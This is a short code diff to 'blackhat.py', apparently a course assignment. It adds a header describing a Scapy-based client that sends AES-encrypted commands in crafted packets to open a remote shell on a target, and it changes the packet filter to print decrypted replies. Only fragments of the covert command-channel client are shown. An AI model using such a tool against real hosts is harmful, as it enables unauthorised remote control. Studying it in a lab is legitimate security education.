@@ -1,3 +1,26 @@
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+--  SOURCE FILE:    blackhat.py
+--
+--  AUTHOR:         Thilina Ratnayake
+--
+--  PROGRAM:        Initiates a connection with a target by crafting its own
+--                  packets, and establishes a remote shell.
+--
+--  FUNCTIONS:      sendCommand(string)
+--                  craftCommandPacket(string)
+--                  encryptCommand(string)
+--                  commandResult(packet)
+--
+--  DATE:           October 17, 2015
+--
+--  REVISIONS:
+--
+--  NOTES:
+--  The program requires the PyCrypto and Scapy libraries for encryption and packet
+--  crafting respectively.
+--  'pip install pycrpyto' or https://www.dlitz.net/software/pycrypto/
+--  'pip install scapy' or http://www.secdev.org/projects/scapy/
+
 import sys, os, argparse, socket, logging
 from scapy.all import *
 from AesEncryption import *
@@ -8,10 +31,11 @@ def stopfilter(pkt):
 	if ARP in pkt:
 		return False
 	if Raw in pkt and UDP in pkt:
-		print pkt['Raw'].load
+		print decrypt(pkt['Raw'].load)
 		return True
 
 def main():
+
 	cmdParser = argparse.ArgumentParser(description="8505A3-PortKnock Client")
 	cmdParser.add_argument('-d','--dstIp',dest='dstIp', help='Destination address of the host to send the message to.', required=True)
 	cmdParser.add_argument('-s','--srcIp',dest='srcIp', help='Source address of the host thats sending.', required=True)
